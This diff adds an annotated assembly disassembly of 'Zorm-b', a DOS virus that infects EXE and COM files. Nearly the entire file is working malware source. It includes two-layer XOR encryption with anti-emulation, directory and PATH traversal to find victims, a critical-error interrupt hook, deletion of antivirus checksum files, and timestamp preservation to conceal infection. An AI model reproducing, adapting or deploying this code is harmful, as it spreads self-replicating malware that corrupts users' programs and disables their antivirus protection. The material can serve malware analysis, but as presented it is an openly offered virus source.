@@ -1,0 +1,707 @@
+Comment *
+                               Zorm-b Virus
+                        disassembled by Yesna/SLAM
+
+        Zorm-b is a 1117 byte direct parasitic exe/com virus, using 
+        one static decryption, encryption algorithm with random crypt 
+        keys. First it decrypts the setup part of the second layer, 
+        which then decrypts the rest of the virus. Zorm-b has a fixed 
+        anti-emulation routine and hooks interrupt 24h. Zorm-b infects
+        via Findfirst and Findnext and will only infect 4 files when
+        executed (2 exe/2 com). Zorm-b will infect files specified in 
+        PATH and is able to change directory. Zorm-b is able to infect
+        com ENUNS files by adding its size to the ENUNS section, causing
+        no system shutdown.
+
+        Greetz to Darkman/29a...
+ 
+*
+
+.model tiny
+.code
+org 100h
+
+start:
+                jmp     begin                  ;Used to save com return code
+                nop                            ;At offset 100h
+
+begin:
+		xor	dx, dx                 ;Anti-emulation routine
+		mov	cx, 11h                ;AL = 2 if not emulated
+                mov     ah, 3dh                ;Open file...
+		int	21h
+
+first_key  equ  byte ptr $+1                   ;Holds first crypt key
+		add	al, 0feh               ;AL = 2 + first_key
+
+first_offset  equ  word ptr $+1                ;Crypts the secnond layer setup
+                mov     bx, 00h                ;BX = Crypt offset
+
+crypt_routine:
+		xor	byte ptr cs:[bx], al   ;Simple XOR cryptor
+		inc	bx                     ;BX = Next byte to crypt
+		loop	crypt_routine          ;Loop 1. CX = 11h  2. CX = 436h 
+                
+		nop	                       ;Will contain a RET instruction
+
+second_layer:
+                mov     byte ptr cs:[second_layer-01h], 0C3h ;Save RET in NOP
+
+second_offset  equ  word ptr $+1               ;Crypts rest of the virus
+                mov     bx, 00h                ;BX = Second crypt offset
+
+second_key  equ  byte ptr $+1                  ;Second crypt key
+		mov	al, 00h                ;AL = Second key
+		mov	cx, (crypt_end-real_start) ;Crypt CX bytes 
+		call	crypt_routine          ;Call cryptor
+
+real_start:
+		mov	ax, ss                 ;AX = SS
+		mov	cx, cs                 ;CX = CS
+		cmp	ax, cx                 ;Is diz an exe or com file?
+		jz	restore_com            ;If SS = CS then com file
+
+		cli	                       ;Disable interrupts
+		mov	ax, ss                 ;AX = SS
+		dec	ax                     ;AX = SS - 1
+		mov	ss, ax                 ;SS = AX = SS - 1
+		sti	                       ;Enable interrupts
+
+		call	delta_offset           ;Get delta offset
+
+		push	ds                     ;Save DS on stack
+		push	cs                     ;Save CS on stack
+		pop	ds                     ;DS = CS
+
+		mov	byte ptr [host][bp], 0 ;0 = Exe, 1 = Com file
+
+		jmp  short  restore_exe        ;Jump to restore exe code...
+
+restore_com:
+		push	ds                     ;Save DS on stack
+		call	delta_offset           ;Get delta offset
+		mov	byte ptr [host][bp], 1 ;1 = Com, 0 = Exe file
+
+restore_exe:
+		pop	ax                     ;AX = DS
+		mov	word ptr [old_ds][bp], ax ;Save DS in variable
+
+		push	es                     ;Save ES on stack
+		push	cs                     ;Save CS on stack
+		pop	es                     ;ES = CS
+
+		cmp	byte ptr [host][bp], 1 ;Is diz a com file?
+		jnz	modify_restore_exe     ;If host = 1 then yes
+	
+        	lea	si, [com_return+04h][bp] ;SI = Offset of COM return
+		mov	di, 100h               ;DI = Start of COM file
+		jmp  short  grab_int24         ;Jumps to int 24h grabber
+
+modify_restore_exe:
+                lea     si, [exe_cs_ip][bp]    ;SI = Original exe CS/IP
+		lea	di, [jump_exe][bp]     ;DI = Offset of EXE return
+		movsw                          ;Copy original exe CS/IP to
+		movsw                          ;Exe jump, restore code.
+
+grab_int24:
+		movsw                          ;Copy 4 bytes for either com or
+		movsw                          ;exe return.
+		pop	es                     ;ES = ES
+
+		lea	dx, [dta_buffer][bp]   ;DX = Offset to store DTA info
+        	call	set_dta                ;Set DTA to point into our buf.
+
+                mov     byte ptr [com_exe_search][bp], 45h ;Infect 2 exe first
+
+		push	es                     ;Save ES on stack
+		mov	ax, 3524h              ;Get int 24h addy
+		int	21h
+
+		mov	word ptr [old_int24][bp], bx ;Save offset of int 24h
+		mov	word ptr [old_int24+2][bp], es ;Save segment of int 24h
+
+                mov     ah, 25h                ;Hook int 24h
+		lea	dx, [handle_int24][bp] ;DX = Offset of int 24h handler
+		int	21h
+
+		pop	es                     ;ES = ES
+
+get_directory: 
+        	mov	byte ptr [infected][bp], 0 ;Reset infected count
+
+                mov     ah, 47h                ;Get directory
+		lea	si, [dir_buffer][bp]   ;SI = Variable for dir. info
+		xor	dl, dl                 ;DL = 0 = Default drive
+		int	21h
+
+		mov	ah, 19h                ;Get current drive
+		int	21h
+		mov	byte ptr [default_drive][bp], al;Save drive in variable
+
+		cmp	al, 2                  ;Is it drive C:?
+		jz	drive_c                ;Yes! Ok, only infect HDD
+
+		mov	dl, 2                  ;Set current drive as C:
+		mov	ah, 0Eh                ;Set drive...
+		int	21h
+
+drive_c:
+		mov	ax, word ptr es:[2ch]  ;AX = Enviroment segment
+		mov	es, ax                 ;ES = Enviroment variables
+
+		xor	di, di                 ;DI = 0
+		mov	si, di                 ;SI = DI = 0
+		jmp  short  find_path          ;Jump find PATH routine
+
+not_matching:
+		inc	si                     ;SI = SI + 1
+		mov	di, si                 ;DI = Search for PATH, next byte
+
+find_path:
+		mov	ax, 4150h              ;AX = 'AP'
+		scasw                          ;Compare AX with ES:DI
+		jnz	not_matching           ;If not found then search again
+
+		mov	ax, 4854h              ;AX = 'TH'
+		scasw                          ;Compare AX with ES:DI
+		jnz	not_matching           ;If not found the search again
+
+                mov     al, 3Dh                ;AL = '='
+		scasb                          ;CompareAL with ES:DI
+		jnz	not_matching           ;If not found the search again
+
+find_file:
+		call	findfirst              ;Find the first to infect
+
+try_again:
+		jb	no_file_found          ;Change dir. if no files found
+		call	test_file              ;Test file, infected? NewEXE?...
+
+		cmp	byte ptr [infected][bp], 2 ;Infect max. 2 files
+		jz	exit                   ;Equal? Then stop infection
+
+		call	findnext               ;Find the next file to infect
+		jmp  short try_again           ;Jumps to try_again
+
+no_file_found:
+		call	change_directory       ;Change directory
+		jnb	find_file              ;Find victim, if we succeed...
+
+		call	infect_path            ;Infect file specified in PATH
+		jnz	find_file              ;Find victim in PATH and infect
+
+		jmp short  exit                ;No files found...
+
+test_file:
+		mov	ax, 3d02h              ;Open file in read/write
+		lea	dx, [dta_buffer+1eh][bp] ;DX = File name in DTA buffer
+		int	21h
+
+		xchg	ax, bx                 ;AX = BX = File handle
+                mov     ah, 3fh                ;Read file...
+		mov	cx, 1ch                ;Read CX bytes
+		lea	dx, [buffer][bp]       ;DX = Offset of header buffer
+		int	21h
+
+		cmp	word ptr [buffer][bp], 5a4dh ;Is diz an exe or com?
+		jz	test_exe               ;Equal? Then its an exe...
+
+		cmp	word ptr [buffer][bp], 4d5ah ;Is diz an exe or com?
+		jnz	infect_com             ;Not equal? Then its a com
+
+test_exe:
+		cmp	word ptr [buffer+12h][bp], 5649h ;Already infected?
+		jz	dont_infect            ;Yes? Then dont infect
+
+		cmp	word ptr [buffer+1ah][bp], 0 ;Overlay file?
+		jnz	dont_infect            ;Not qual? Dont infect...
+
+                cmp     word ptr [buffer+18h][bp], 40h ;NewEXE file?
+		jz	dont_infect            ;Equal? Dont infect...
+
+		mov	byte ptr [exe_or_com][bp], 0 ;Infecting a exe file.
+		jmp  short  infect             ;Jump to infection routine  
+
+infect_com:
+                cmp     byte ptr [buffer+03h][bp], 56h ;Already ready infected?
+		jz      dont_infect            ;Yes? Then dont infect
+
+		push	di                     ;Save DI on stack
+		push	es                     ;Save ES on stack
+		push	cs                     ;Save CS on stack
+		pop	es                     ;ES = CS
+
+		mov	byte ptr [exe_or_com][bp], 1 ;Infecting a com file?
+
+		jmp  short  com_return_code    ;Jump to com_return_code
+
+exit:
+		jmp	return_to_host         ;jump to restore_to_host
+
+com_return_code:
+		lea	si, [buffer][bp]       ;SI = Header of file...
+		lea	di, [com_return+04h][bp] ;DI = Com return routine
+
+		movsw                          ;Copy 4 bytes to ES:DI, save
+		movsw                          ;original com header in buffer
+		
+                pop	es                     ;ES = ES
+		pop	di                     ;DI = DI
+
+infect:
+		mov	ax, 4300h              ;Get file attributes...
+		lea	dx, [dta_buffer+1eh][bp] ;DX = File name in DTA
+		int	21h
+
+		mov	word ptr [file_attrib][bp], cx ;Save file attribute
+
+		lea	dx, [dta_buffer+1eh][bp] ;DX = File name in DTA
+		call	set_attrib             ;Set new attributes for file
+
+		lea	dx, [anti_vira][bp]    ;DX = AV files
+		call	set_attrib             ;Set new attributes for AV file
+
+		call	delete_file            ;Delete AV file
+		jmp  short  proceed_infect     ;Jump to proceed_infect
+
+dont_infect:
+		jmp	close_file             ;Jump to close_file 
+
+proceed_infect:
+		lea	dx, [anti_vira+0ch][bp] ;DX = Next AV file
+		call	set_attrib             ;Set new attributes for AV file
+		call	delete_file            ;Delete the AV file
+
+		lea	dx, [anti_vira+19h][bp+556h] ;DX = Next AV file
+		call	set_attrib             ;Set new attributes for AV file
+		call	delete_file            ;Delete AV file
+
+		mov	ax, 5700h              ;Get date/time of file
+                int     21h
+
+		push	cx                     ;Save CX on stack
+		push	dx                     ;Save DX on stack
+
+		cmp	byte ptr [exe_or_com][bp], 1 ;Infecting a com file?
+		jz	com_file               ;Equal? Then its a com 
+
+		mov	ax, word ptr [buffer+0eh][bp];AX = SS of file in header
+		mov	word ptr [exe_ss_sp+2][bp], ax ;Save AX (SS) in return.
+
+		mov	ax, word ptr [buffer+10h][bp];AX = SP of file in header
+		mov	word ptr [exe_ss_sp][bp], ax ;Save AX (SP) in return.
+
+		mov	ax, word ptr [buffer+14h][bp];AX = IP of file in header
+		mov	word ptr [exe_cs_ip][bp], ax ;Save AX (IP) in return.
+
+		mov	ax, word ptr [buffer+16h][bp];AX = CS of file in header
+		mov	word ptr [exe_cs_ip+2][bp], ax ;Save AX (CS) in return.
+
+com_file:
+		call	seek_eof               ;Goto EOF
+
+		cmp	byte ptr [exe_or_com][bp], 1 ;Infecting a com file?
+		jnz	calculate_exe          ;Not equal? Then calculate exe
+
+		sub	ax, 7                  ;Sub AX with 7
+		xchg	ax, dx                 ;DX = AX = Offset EOF - 7
+		mov	cx, 0                  ;CX = 0
+		mov	ax, 4200h              ;Goto EOF - 7 = ENUNS section of
+		int	21h                    ;com file
+
+                mov     ah, 3Fh                ;Read file...
+		mov	cx, 7                  ;Read CX bytes (ENUNS Info)
+          	lea	dx, [second_copy+(crypt_end-begin)][bp];DX = 7 byte Buf
+		int	21h
+
+        	add	word ptr [second_layer+(crypt_end-begin+5)][bp], 463h
+                                               ;Add virus size to ENUNS info
+
+		call	seek_eof               ;Goto EOF
+
+		mov	cx, ax                 ;CX = AX = Offset of EOF
+		sub	ax, 3                  ;AX = Offset of EOF - 3
+		mov	word ptr [com_return+01h][bp], ax ;Save jump offset
+		add	cx, 100h               ;CX = Offset EOF + 100h
+
+		jmp  short  setup_crypt_offs   ;Jump to setup_crypt_offs
+
+calculate_exe:
+		push	ax                     ;Save AX on stack
+		push	dx                     ;Save DX on stack
+		push	ax                     ;Save AX on stack
+
+		mov	ax, word ptr [buffer+08h][bp];AX = Header size in para.
+		mov	cl, 4                  ;Convert to byte sized
+		shl	ax, cl                 ;Shift 4 bits left
+		mov	cx, ax                 ;CX = AX = Header size
+
+		pop	ax                     ;AX = File size (offset)
+
+		sub	ax, cx                 ;AX = File size - header
+		sbb	dx, 0                  ;DX = Segment pointer
+
+		mov	cl, 0Ch                ;Convert DX to new segment
+		shl	dx, cl                 ;Shift 12 bits left
+
+		mov	cl, 4                  ;Convert AX to new offset
+		push	ax                     ;Save AX on stack
+		shr	ax, cl                 ;Shift AX 4 bits right
+		add	dx, ax                 ;DX = Seg. + AX = Size in para
+		shl	ax, cl                 ;AX = New offset
+
+		pop	cx                     ;CX = AX = File size - header
+
+         	sub	cx, ax                 ;CX = New IP
+
+		mov	word ptr [buffer+14h][bp], cx ;Save new IP in buffer
+		mov	word ptr [buffer+16h][bp], dx ;Save new CS in buffer
+		inc	dx                     ;Increment DX
+		mov	word ptr [buffer+0eh][bp], dx ;Save new SS in buffer
+
+		mov	word ptr [buffer+10h][bp], 0a00h ;Save new SP in buffer
+                mov     word ptr [buffer+0ah][bp], 0a0h ;Save new MinMem in buf
+		mov	word ptr [buffer+12h][bp], 5649h ;Save infection stamp
+
+setup_crypt_offs:
+		push	cx                     ;Save CX on stack
+                add     cx, 26h                ;CX + 26h = Offset for cryptor 
+		mov	[second_offset][bp], cx;Save CX in buffer
+		pop	cx                     ;CX = New IP
+
+		push	cx                     ;Save CX on stack
+		add	cx, 14h                ;CX = Offset for RET instruction
+		mov	word ptr [second_layer+03h][bp], cx ;Save CX in buffer
+		pop	cx                     ;CX = New IP
+
+		add	cx, 15h                ;CX + 15h = Offset for cryptor
+		mov	word ptr [first_offset][bp], cx ;Save CX in buf.
+
+		cmp	byte ptr [exe_or_com][bp], 1 ;Com or exe file?
+		jz	crypt                  ;Equal? Then jump to setup
+
+		pop	dx                     ;DX = Segment of file size
+		pop	ax                     ;AX = Offset of file size
+		add	ax, 45Ch               ;AX = Offset + virus
+		adc	dx, 0                  ;DX = Segment + 1, if carry set
+
+		mov	cx, 200h               ;Convert file size to
+		div	cx                     ;512 byte pages
+		cmp	dx, 0                  ;Is DX = 0?
+		jz	dont_inc_page          ;Equal? then jump...
+
+		inc	ax                     ;AX = File size in 512 byte page
+
+dont_inc_page:
+		mov	word ptr [buffer+04h][bp], ax ;Save number of 512 pages
+		mov	word ptr [buffer+02h][bp], dx ;Save bytes in last page
+
+crypt:
+		call	setup_encryptor         ;Copy virus and encrypt it.
+
+		lea	si, [second_copy+(second_layer-begin)][bp];Start offset
+		mov	cx, (crypt_end-second_layer) ;Number of byte to search
+
+find_start:
+                cmp     byte ptr [si], 0CDh     ;Search for a Int call (CDh)
+		jz	crypt                   ;Found? Then crypt again
+		inc	si                      ;SI = Next byte to search
+		loop	find_start              ;Loop CX times
+
+                mov     byte ptr [second_copy+(second_layer-begin)-1][bp], 90h
+                                                ;Delete RET inst. in crypt rou.
+
+                mov     ah, 40h                 ;Write to file...
+		mov	cx, (crypt_end-begin+7) ;Number to write (CX)
+		lea	dx, [second_copy][bp]   ;DX = Encrypted virus offset
+		int	21h
+
+		mov	ax, 4200h               ;Goto SOF
+		xor	cx, cx                  ;CX = 0
+		cwd	                        ;DX = 0
+		int	21h
+
+		cmp	byte ptr [exe_or_com][bp], 1 ;Com or exe file?
+		jnz	write_exe_header        ;Not equal? Then write exe
+
+		lea	dx, [com_return][bp]    ;DX = Com return code
+		mov	cx, 4                   ;Write 4 bytes to file
+		jmp   short  write_com_header   ;Jump to write_com_header
+
+write_exe_header:
+		mov	cx, 1Ah                 ;Write 1Ah bytes to file
+		lea	dx, [buffer][bp]        ;DX = Exe buffer (header)
+
+write_com_header:
+                mov     ah, 40h                 ;Write to file (exe/com header)
+		int	21h 
+
+		inc	byte ptr [infected][bp] ;Inc. number of files infected
+		mov	cx, word ptr [file_attrib][bp] ;CX = File attributes
+		lea	dx, [dta_buffer+1eh][bp];DX = File name in DTA
+
+		mov	ax, 4301h               ;Restore file attributes
+		int	21h
+
+		mov	ax, 5701h               ;Save date/time stamp
+		pop	dx                      ;DX = Date stamp of file
+		pop	cx                      ;CX = Time stamp of file
+                int     21h 
+
+close_file:
+                mov     ah, 3Eh                 ;Close file
+		int	21h
+
+		ret	                        ;Return to caller...
+
+return_to_host:
+		mov	dl, byte ptr [default_drive][bp];DL = Original drive
+		mov	ah, 0Eh                 ;Set current drive
+		int	21h
+
+                mov     ah, 3Bh                 ;Change directory
+                mov     byte ptr [backslash][bp], '/';Save a '/' in buffer
+		lea	dx, [backslash][bp]     ;DX = Original directory
+		int	21h
+
+                cmp     byte ptr [com_exe_search][bp], 'C';Both exe and com?
+		jz	restore                 ;Not eqaul? Then infect com
+
+                mov     byte ptr [com_exe_search][bp], 'C' ;Infect com now
+		jmp	get_directory           ;Jump to get_directory
+
+restore:
+		mov	ax, word ptr [old_ds][bp] ;AX = DS = PSP
+		push	ax                      ;Save AX on stack
+		pop	ds                      ;DS = DS = PSP
+
+                mov     dx, 80h                 ;DX = PSP + 80h = Our file DTA
+		call	set_dta                 ;Set DTA to our file
+
+		push	ds                      ;Save DS on stack
+		mov	ax, 2524h               ;Restore original int 24h
+		lds	dx, [old_int24][bp]     ;DX = Original addy
+		int	21h
+
+		pop	ds                      ;DS = DS = PSP
+		push	ds                      ;Save DS on stack
+		pop	es                      ;ES = DS = PSP
+		cmp	byte ptr [host][bp], 1  ;Is diz an exe or com file
+		jnz	exit_exe                ;Not equal? Then its exe
+
+		mov	ax, 100h                ;AX = Com start...
+		push	ax                      ;Save AX on stack
+		ret	                        ;Jump back to host...(AX)
+
+exit_exe:
+		mov	ax, es                  ;AX = ES = PSP
+		add	ax, 10h                 ;AX = PSP + 10h
+
+		add	word ptr cs:[jump_exe+02h][bp], ax ;Save CS in jump
+
+		cli	                        ;Disable interrupts
+		add	ax, word ptr cs:[jump_exe+06h][bp] ;AX = Original SS
+		mov	ss, ax                  ;SS = AX = Original SS
+		mov	sp, word ptr cs:[jump_exe+04h][bp] ;Original SP
+		sti	                        ;Enable interrupts
+
+                db      0eah                    ;Jump opcode
+jump_exe        dd 0000F0FFh                    ;Place to jump to...
+                dd 0000F0FFh                    ;Contains original SS/SP
+exe_cs_ip       dd 00000000h                    ;Store original CS/IP
+exe_ss_sp       dd 00000000h                    ;Store original SS/SP
+
+findfirst:
+                mov     ah, 4Eh                 ;Find first file...
+
+                cmp     byte ptr [com_exe_search][bp], 'C';com or exe search?
+		jnz	try_exe_search          ;Not equal? Search for exe
+
+		lea	dx, [com_filemask][bp]  ;DX = Com filemask
+		jmp  short  start_search        ;Jump to start_search
+
+try_exe_search:
+		lea	dx, [exe_filemask][bp]  ;DX = Exe filemask
+
+start_search:
+		mov	cx, 7                   ;File attribute
+		int	21h
+
+		ret	                        ;Return to caller...
+
+findnext:
+                mov     ah, 4Fh                 ;Find next matching file
+		int	21h
+
+		ret	                        ;Return to caller...
+
+change_directory:
+                mov     ah, 3Bh                 ;Change directory...
+		lea	dx, [upper_dir][bp]     ;DX = Upper directory
+		int	21h
+
+		ret	                        ;Return to caller...
+
+infect_path:
+		lea	si, [path_dir][bp]      ;SI = Path info...
+
+find_file_in_path:
+                cmp     byte ptr es:[di], 3Bh   ;Found '='?
+		jz	path_found              ;Yes? Then jump to path_...
+
+		cmp	byte ptr es:[di], 0     ;Is ES:DI = 0?
+		jz	clear_ax                ;Yes? Then jump to clear_ax...
+
+		mov	ah, byte ptr es:[di]    ;AH = Byte in ES:DI
+		mov	byte ptr [si], ah       ;Save AH in buffer...
+		inc	di                      ;Increment DI
+		inc	si                      ;Increment SI
+		jmp  short  find_file_in_path   ;Jump to find_path...
+
+path_found:
+		mov	byte ptr [si], 0        ;Reset '=' in buffer
+		inc	di                      ;Increment DI
+                mov     ah, 3Bh                 ;Change directory
+		lea	dx, [path_dir][bp]      ;DX = Buffer of directory
+		int	21h
+ 
+		ret	                        ;Return to caller...
+
+clear_ax:
+		xor	ax, ax                  ;AX = 0
+		ret	                        ;Return to caller...
+
+setup_encryptor:
+		push	ax                      ;Save AX on stack
+		push	bx                      ;Save BX on stack
+		mov	al, byte ptr [second_key][bp] ;AL = Second crypt key
+		inc	al                      ;AL = Second crypt key + 1
+
+		cmp	al, 0                   ;Is AL = 0?
+		jnz	dont_inc                ;No? Then dont increment
+
+		inc	al                      ;Increment AL if = 0
+
+dont_inc:
+		mov	byte ptr [second_key][bp], al ;Save AL as new second key
+		mov	ah, byte ptr [first_key][bp] ;AH = First crypt key
+		inc	ah                      ;AH = First crypt key + 1
+
+		cmp	ah, 0                   ;Is AH = 0?
+		jnz	crypt_virus_in_space    ;No? Then dont increment
+ 
+		inc	ah                      ;Increment AH if = 0
+
+crypt_virus_in_space:
+		mov	byte ptr [first_key][bp], ah ;Save AH as new first key
+
+		push	di                      ;Save DI on stack
+		push	es                      ;Save ES on stack
+		push	cs                      ;Save CS on stack
+		pop	es                      ;ES = CS
+
+		lea	si, [begin][bp]         ;SI = Start of virus
+		lea	di, [second_copy][bp]   ;DI = Area to put crypted virus
+		mov	cx, (crypt_end-begin)   ;Copy CX bytes
+		rep movsb                       ;Copy DS:SI to ES:DI...
+
+		pop	es                      ;ES = ES
+		pop	di                      ;DI = DI
+		mov	cx, (crypt_end-real_start) ;CX = Number to crypt
+		lea	bx, [second_copy+(real_start-begin)][bp] ;BX = Offset..
+
+		call	crypt_routine           ;Call crypt_routine
+
+		xchg	al, ah                  ;AH = AL, AL = AH
+		inc	al                      ;AL = AL + 1
+		inc	al                      ;AL = AL + 1
+		mov	cx, (real_start-second_layer) ;CX = Number to crypt
+		lea	bx, [second_copy+(second_layer-begin)][bp] ;BX = Offset
+
+		call	crypt_routine           ;Call crypt_routine
+
+		pop	bx                      ;BX = File handler
+		pop	ax                      ;AX = Nubmer of bytes in l.page
+		ret	                        ;Return to caller...
+
+set_attrib:
+		mov	ax, 4301h               ;Set file attributes
+		xor	cx, cx                  ;CX = 0 = No attributes
+		int	21h
+
+		ret	                        ;Return to caller...
+
+delete_file:
+                mov     ah, 41h                 ;Delete file...
+		int	21h
+
+		ret	                        ;Return to caller...
+
+handle_int24:
+                mov     al, 03h                 ;AL = Critical error hand..
+                iret                            ;Return from DOS
+
+set_dta:
+		mov	ah, 1Ah                 ;Set DTA...
+		int	21h
+
+		ret	                        ;Return to caller...
+
+delta_offset:
+		call	calc_delta              ;Call calc_delta
+
+calc_delta:
+		pop	bp                      ;BP = Return from CALL
+		sub	bp, (calc_delta-start+100h) ;BP = Delta offset
+		ret	                        ;Return to caller...
+
+seek_eof:
+		mov	ax, 4202h               ;Goto EOF
+		xor	cx, cx                  ;CX = 0
+		cwd	                        ;DX = 0 if AX < 8000h
+		int	21h
+
+		ret	                        ;Return to caller...
+
+virus_name      db '(c)Zorm-b',0                ;Virus name...
+author          db 'by Dr.L'                    ;Virus creator...
+com_return:
+                db 0e9h                         ;Jump opcode
+                dw 00h                          ;addy to jump to
+                push si                         ;Infection mark...'V'
+                nop                             ;Do nutthin...
+                nop                             ;Do nutthin...
+                int 20h                         ;Terminate from com file
+
+anti_vira:
+                db 'anti-vir.dat',0            ;Deletes these av files...
+                db 'chklist.ms',0
+                db 'chklist.cpe',0
+
+upper_dir       db '..',0                       ;Used to get to upper directory
+
+exe_filemask    db '*.exe',0                    ;Used to search for exe file
+com_filemask    db '*.com',0                    ;Used to search for com file
+
+crypt_end:
+
+exe_or_com      db ?                            ;Determine wether its exe/com
+host            db ?                            ;Is host a com or an exe file?
+com_exe_search  db ?                            ;Search for both com/exe
+default_drive   db ?                            ;Current drive
+file_attrib     dw ?                            ;File attributes
+old_int24       dd ?                            ;Original int 24h addy
+old_ds          dw ?                            ;Original DS register
+infected        db ?                            ;Number of infected files
+backslash       db ?                            ;Used to get back to dir.
+dir_buffer      db 40h dup(?)                   ;Current directory
+buffer          db 1ch dup(?)                   ;File header buffer
+dta_buffer      db 2bh dup(?)                   ;DTA info about file...
+path_dir        db 40h dup(?)                   ;Directory in PATH
+
+second_copy:
+                db (crypt_end-begin+7) dup(?)   ;Area to put crypted copy
+
+virus_end:
+
+end    start
